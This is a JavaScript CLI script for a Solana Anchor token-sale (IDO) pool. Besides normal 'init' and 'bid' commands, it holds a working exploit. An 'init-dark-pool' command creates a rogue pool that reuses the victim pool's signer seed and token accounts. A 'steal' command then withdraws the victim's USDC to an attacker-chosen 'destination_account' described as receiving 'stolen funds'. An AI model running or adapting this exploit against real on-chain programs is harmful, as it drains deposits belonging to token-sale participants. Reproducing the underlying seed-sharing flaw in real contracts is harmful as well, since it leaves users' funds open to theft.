const anchor = require("@project-serum/anchor");
const serum = require("@project-serum/common");
const yargs = require('yargs/yargs');
const fs = require('fs');
const { hideBin } = require('yargs/helpers')
const { TokenInstructions } = require("@project-serum/serum");

const provider = anchor.Provider.local(process.env.CLUSTER_RPC_URL);
// Configure the client to use the local cluster.
anchor.setProvider(provider);

const program = anchor.workspace.IdoPool;

// TODO: remove this constant once @project-serum/serum uses the same version
//       of @solana/web3.js as anchor (or switch packages).
const TOKEN_PROGRAM_ID = new anchor.web3.PublicKey(
  TokenInstructions.TOKEN_PROGRAM_ID.toString()
);

async function initPool(
  usdcMint, redeemableMint, watermelonMint, creatorWatermelon, watermelonIdoAmount,
  startIdoTs, endDepositsTs, endIdoTs, poolAccount) {

  // We use the watermelon mint address as the seed, could use something else though.
  const [poolSigner, nonce] = await anchor.web3.PublicKey.findProgramAddress(
    [watermelonMint.toBuffer()],
    program.programId
  );

  // Pool doesn't need a Redeemable SPL token account because it only
  // burns and mints redeemable tokens, it never stores them.
  poolWatermelon = await serum.createTokenAccount(provider, watermelonMint, poolSigner);
  poolUsdc = await serum.createTokenAccount(provider, usdcMint, poolSigner);
  distributionAuthority = provider.wallet.publicKey;

  // Atomically create the new account and initialize it with the program.
  await program.rpc.initializePool(
    watermelonIdoAmount,
    nonce,
    startIdoTs,
    endDepositsTs,
    endIdoTs,
    {
      accounts: {
        poolAccount: poolAccount.publicKey,
        poolSigner,
        distributionAuthority,
        creatorWatermelon,
        redeemableMint,
        usdcMint,
        poolWatermelon,
        poolUsdc,
        tokenProgram: TOKEN_PROGRAM_ID,
        rent: anchor.web3.SYSVAR_RENT_PUBKEY,
        clock: anchor.web3.SYSVAR_CLOCK_PUBKEY,
      },
      signers: [poolAccount],
      instructions: [
        await program.account.poolAccount.createInstruction(poolAccount),
      ],
    }
  );

  console.log(`🏦 IDO pool initialized with ${(watermelonIdoAmount.toNumber() / 1000000).toFixed(2)} tokens`);
  console.log(`Pool Account: ${poolAccount.publicKey.toBase58()}`);
  console.log(`Pool Authority: ${distributionAuthority.toBase58()}`);
  console.log(`Redeem Mint: ${redeemableMint.toBase58()}`);
  console.log(`🍉 Account: ${poolWatermelon.toBase58()}`);
  console.log(`💵 Account: ${poolUsdc.toBase58()}`);
}


async function initDarkPool(
  sourcePool, watermelonMint, creatorWatermelon, watermelonIdoAmount,
  startIdoTs, endDepositsTs, endIdoTs) {

  // We use the watermelon mint address as the seed, could use something else though.
  const [_poolSigner, nonce] = await anchor.web3.PublicKey.findProgramAddress(
    [watermelonMint.toBuffer()],
    program.programId
  );
  poolSigner = _poolSigner;

  // verify nonce is the same
  const source = await program.account.poolAccount.fetch(sourcePool);
  if (nonce != source.nonce) {
    console.log('wrong nonce', nonce, '!=', source.nonce)
    return
  }

  // fetch usdc mint to set redeemable decimals to the same value
  const mintInfo = await serum.getMintInfo(provider, watermelonMint)

  // Pool doesn't need a Redeemable SPL token account because it only
  // burns and mints redeemable tokens, it never stores them.
  redeemableMint = await serum.createMint(provider, poolSigner, mintInfo.decimals);
  poolWatermelon = source.poolWatermelon
  poolUsdc = source.poolWatermelon
  distributionAuthority = provider.wallet.publicKey;
  poolAccount = new anchor.web3.Account();


  console.log('initializePool', watermelonIdoAmount.toString(), nonce, startIdoTs.toString(), endDepositsTs.toString(), endIdoTs.toString())
  // Atomically create the new account and initialize it with the program.
  await program.rpc.initializePool(
    watermelonIdoAmount,
    nonce,
    startIdoTs,
    endDepositsTs,
    endIdoTs,
    {
      accounts: {
        poolAccount: poolAccount.publicKey,
        poolSigner,
        distributionAuthority,
        creatorWatermelon,
        redeemableMint,
        usdcMint: watermelonMint,
        poolWatermelon,
        poolUsdc,
        tokenProgram: TOKEN_PROGRAM_ID,
        rent: anchor.web3.SYSVAR_RENT_PUBKEY,
        clock: anchor.web3.SYSVAR_CLOCK_PUBKEY,
      },
      signers: [poolAccount],
      instructions: [
        await program.account.poolAccount.createInstruction(poolAccount),
      ],
    }
  );

  console.log(`🏦 Dark pool initialized with ${(watermelonIdoAmount.toNumber() / 1000000).toFixed(2)} tokens`);
  console.log(`Pool Account: ${poolAccount.publicKey.toBase58()}`);
  console.log(`Pool Authority: ${distributionAuthority.toBase58()}`);
  console.log(`Redeem Mint: ${redeemableMint.toBase58()}`);
  console.log(`🍉 Account: ${poolWatermelon.toBase58()}`);
  console.log(`💵 Account: ${poolUsdc.toBase58()}`);
}

async function steal(darkPoolAccount, destination) {
  const darkPool = await program.account.poolAccount.fetch(darkPoolAccount);

  // We use the watermelon mint address as the seed, could use something else though.
  const [poolSigner, _nonce] = await anchor.web3.PublicKey.findProgramAddress(
    [darkPool.watermelonMint.toBuffer()],
    program.programId
  );

  await program.rpc.withdrawPoolUsdc({
    accounts: {
      poolAccount: darkPoolAccount,
      poolSigner,
      distributionAuthority: provider.wallet.publicKey,
      creatorUsdc: destination,
      poolUsdc: darkPool.poolUsdc,
      tokenProgram: TOKEN_PROGRAM_ID,
      clock: anchor.web3.SYSVAR_CLOCK_PUBKEY,
    },
  });
}

async function bid(poolAccount, userUsdc, bidAmount, userRedeemable) {

  const account = await program.account.poolAccount.fetch(poolAccount);

  // We use the watermelon mint address as the seed, could use something else though.
  const [_poolSigner, nonce] = await anchor.web3.PublicKey.findProgramAddress(
    [account.watermelonMint.toBuffer()],
    program.programId
  );
  poolSigner = _poolSigner;

  const currentBid = await serum.getTokenAccount(provider, userRedeemable);

  if (currentBid.amount.lt(bidAmount)) {
    const depositAmount = bidAmount.sub(currentBid.amount);
    console.log(`increasing bid by ${(depositAmount.toNumber() / 1000000).toFixed(2)} 💵`);

    await program.rpc.exchangeUsdcForRedeemable(
      depositAmount,
      {
        accounts: {
          poolAccount,
          poolSigner,
          redeemableMint: account.redeemableMint,
          poolUsdc: account.poolUsdc,
          userAuthority: provider.wallet.publicKey,
          userUsdc,
          userRedeemable,
          tokenProgram: TOKEN_PROGRAM_ID,
          clock: anchor.web3.SYSVAR_CLOCK_PUBKEY,
        },
      });
  } else if (currentBid.amount.gt(bidAmount)) {
    const withdrawAmount = currentBid.amount.sub(bidAmount);
    console.log(`decreasing bid by ${(withdrawAmount.toNumber() / 1000000).toFixed(2)} 💵`);

    await program.rpc.exchangeRedeemableForUsdc(withdrawAmount, {
      accounts: {
        poolAccount,
        poolSigner,
        redeemableMint: account.redeemableMint,
        poolUsdc: account.poolUsdc,
        userAuthority: provider.wallet.publicKey,
        userUsdc,
        userRedeemable,
        tokenProgram: TOKEN_PROGRAM_ID,
        clock: anchor.web3.SYSVAR_CLOCK_PUBKEY,
      },
    });

  } else {
    console.log('bid unchanged 💎');
  }
}

const usdc_mint = {
  describe: 'the mint of the token sale bids 💵',
  type: 'string'
}

const watermelon_mint = {
  describe: 'the mint of the token for sale 🍉',
  type: 'string'
}

const watermelon_account = {
  describe: 'the account supplying the token for sale 🍉',
  type: 'string'
}

const watermelon_amount = {
  describe: 'the amount of tokens offered in this sale 🍉',
  type: 'number'
}

const pool_account = {
  describe: 'the token sale pool account 🏦',
  type: 'string'
}

const start_time = {
  describe: 'the unix time at which the token sale is starting',
  default: 60 + (Date.now() / 1000),
  type: 'number'
}

const deposit_duration = {
  describe: 'the number of seconds users can deposit into the pool',
  default: 24 * 60 * 60,
  type: 'number'
}

const cancel_duration = {
  describe: 'the number of seconds users can withdraw from the pool to cancel their bid',
  default: 24 * 60 * 60,
  type: 'number'
}


yargs(hideBin(process.argv))
  .command(
    'init <usdc_mint> <redeemable_mint> <watermelon_mint> <watermelon_account> <watermelon_amount>',
    'initialize IDO pool',
    y => y
      .positional('usdc_mint', usdc_mint)
      .positional('redeemable_mint',  { describe: 'the redeemable mint', type: 'string' })
      .positional('watermelon_mint', watermelon_mint)
      .positional('watermelon_account', { describe: 'the account supplying the token for sale 🍉', type: 'string' })
      .positional('watermelon_amount', { describe: 'the amount of tokens offered in this sale 🍉', type: 'number' })
      .option('start_time', start_time)
      .option('deposit_duration', deposit_duration)
      .option('cancel_duration', cancel_duration)
      .option('pool_account', { describe: 'path to a keyfile for the pool acocunt', type: 'string'}),
    args => {
      const start = new anchor.BN(args.start_time);
      const endDeposits = new anchor.BN(args.deposit_duration).add(start);
      const endIdo = new anchor.BN(args.cancel_duration).add(endDeposits);
      const poolAccount = new anchor.web3.Account(args.pool_account && JSON.parse(fs.readFileSync(args.pool_account, 'utf-8')));
      initPool(
        new anchor.web3.PublicKey(args.usdc_mint),
        new anchor.web3.PublicKey(args.redeemable_mint),
        new anchor.web3.PublicKey(args.watermelon_mint),
        new anchor.web3.PublicKey(args.watermelon_account),
        new anchor.BN(args.watermelon_amount * 1000000), // assuming 6 decimals
        start,
        endDeposits,
        endIdo,
        poolAccount
      );
    })
  .command(
    'bid <pool_account> <usdc_account> <usdc_amount> <redeemable_account>',
    'place bid in IDO sale',
     y => y
      .positional('pool_account', pool_account)
      .positional('usdc_account', { describe: 'the account supplying the token sale bids 💵', type: 'string' })
      .positional('usdc_amount', { describe: 'the amount of tokens bid for this sale 💵', type: 'number' })
      .positional('redeemable_account', { describe: 'the account receiving the redeemable pool token', type: 'string' }),
    args => {
      bid(
        new anchor.web3.PublicKey(args.pool_account),
        new anchor.web3.PublicKey(args.usdc_account),
        new anchor.BN(args.usdc_amount * 1000000), // assuming 6 decimals
        new anchor.web3.PublicKey(args.redeemable_account)
      );
    })
  .command(
    'init-dark-pool <source_pool> <watermelon_mint> <watermelon_account> <watermelon_amount>',
    'initialize dark IDO pool',
    y => y
      .positional('source_pool', { describe: 'the account to drain', type: 'string'} )
      .positional('watermelon_mint', watermelon_mint)
      .positional('watermelon_account', { describe: 'the account supplying the token for sale 🍉', type: 'string' })
      .positional('watermelon_amount', { describe: 'the amount of tokens offered in this sale 🍉', type: 'number' })
      .option('start_time', start_time)
      .option('deposit_duration', deposit_duration)
      .option('cancel_duration', cancel_duration),
    args => {
      const start = new anchor.BN(args.start_time);
      const endDeposits = new anchor.BN(args.deposit_duration).add(start);
      const endIdo = new anchor.BN(args.cancel_duration).add(endDeposits);
      initDarkPool(
        new anchor.web3.PublicKey(args.source_pool),
        new anchor.web3.PublicKey(args.watermelon_mint),
        new anchor.web3.PublicKey(args.watermelon_account),
        new anchor.BN(args.watermelon_amount * 1000000), // assuming 6 decimals
        start,
        endDeposits,
        endIdo
      );
    })
  .command(
    'steal <pool_account> <destination_account>',
    'steal funds from IDO sale',
    y => y
    .positional('pool_account', pool_account)
    .positional('destination_account', { describe: 'the account receiving the stolen funds', type: 'string' }),
    args => {
      steal(
        new anchor.web3.PublicKey(args.pool_account),
        new anchor.web3.PublicKey(args.destination_account),
      )
    })
  .argv;
